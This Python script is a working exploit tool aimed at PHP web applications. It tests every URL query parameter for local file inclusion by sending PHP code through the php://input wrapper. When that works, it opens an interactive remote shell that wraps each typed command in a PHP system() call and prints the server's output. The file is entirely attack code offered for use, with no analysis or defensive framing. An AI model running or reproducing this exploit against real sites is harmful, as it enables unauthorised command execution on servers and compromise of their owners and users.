import re
import os
import urllib
import random
import string
import requests

from rich.console import Console
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class PHPInputExploiter:
    
    def __init__(self, url, silent=False):
        self.console = Console()
        self.url = self.ensure_correct_protocol(url)
        self.silent = silent
        self.file_to_use = "php://input"
        self.string = self._generate_random_string()

        half = len(self.string) // 2
        self.string_first_half = self.string[:half]
        self.string_second_half = self.string[half:]
        
        self.LFI_TEST_FILES = [
            (f"<?php echo '{self.string_first_half}' . '{self.string_second_half}'; ?>", re.compile(fr'{self.string}')),
        ]

    def ensure_correct_protocol(self, url):
        if not url.startswith(('http://', 'https://')):
            try:
                requests.get('https://' + url, timeout=3, verify=False)
                return 'https://' + url
            except requests.exceptions.RequestException:
                try:
                    requests.get('http://' + url, timeout=3, verify=False)
                    return 'http://' + url
                except requests.exceptions.RequestException:
                    pass
        return url
    
    def _generate_random_string(self, length=6):
        return ''.join(random.choice(string.ascii_letters) for _ in range(length))
    

        
    def filter_check(self):
        console = Console()
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        file_paths = self.LFI_TEST_FILES

        return self._scan(params, file_paths, parsed_url, console) 
    
    def _scan(self, params, file_paths, parsed_url, console):

        for param_name in params.keys():
            for i, (file_path, file_regex) in enumerate(file_paths):
                new_params = params.copy()
                new_params[param_name] = file_path
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                
                try:
                    response = requests.post(fuzzed_url, verify=False, data=self.LFI_TEST_FILES[0][0])
                except requests.exceptions.ConnectionError:
                    self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
                    return False, None
                
                match = file_regex.search(response.text)
                if match:
                    if not self.silent:
                        console.print(f'\n[bold red]Possible LFI2RCE (php_input: method)[/bold red]', style='bold red')
                    self.success_depth = i
                    self.base64_content = match.group(0)
                    return True, param_name
        return False, None
                
    def run_shell(self, param_name):
        self.silent = True
        if not param_name:
            self.console.print("[bold red]No valid parameter name provided.[/bold red]")
            return

        self.console.print("[bold yellow]Interactive shell is ready. Type your commands.[/bold yellow]")
            
        session = PromptSession(history=InMemoryHistory())        
        while True:
            try:
                cmd = session.prompt(HTML('<ansired><b># </b></ansired>'))
            
                if "exit" in cmd:
                    raise KeyboardInterrupt
                elif not cmd:
                    continue
                elif "clear" in cmd:
                    if os.name == 'posix':
                        os.system('clear')
                elif os.name == 'nt':
                    os.system('cls')                                                             
                if cmd.lower() in ["exit", "quit"]:
                    break
                cmd = f"<?php echo '['; echo 'S]'; system('{cmd}'); echo '[E]';?>"
                shell_code = self.file_to_use
                parsed_url = urllib.parse.urlparse(self.url)
                params = urllib.parse.parse_qs(parsed_url.query)
                new_params = params.copy()
                new_params[param_name] = shell_code
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))

                try:
                    response = requests.post(fuzzed_url, data=cmd)
                except requests.exceptions.ConnectionError:
                    self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
                 
                pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL) 
                response_content = pattern.search(response.text)
                if response_content:
                    shell_output = response_content.group(1)
                    self.console.print(f"[bold green]{shell_output}[/bold green]")
                else:
                    self.console.print("[bold red]No shell output.[/bold red]")
                    
            except KeyboardInterrupt:
                    self.console.print("[bold yellow][!] Exiting shell...[/bold yellow]")
                    break        
                  

def main():
    url = input('Enter site URL to test: ')
    checker = PHPInputExploiter(url, silent=False)
    result, param_name = checker.filter_check()
    print(f"LFI detected: {result}")
    if result:
        checker.run_shell(param_name)
        
if __name__ == '__main__':
    main() 
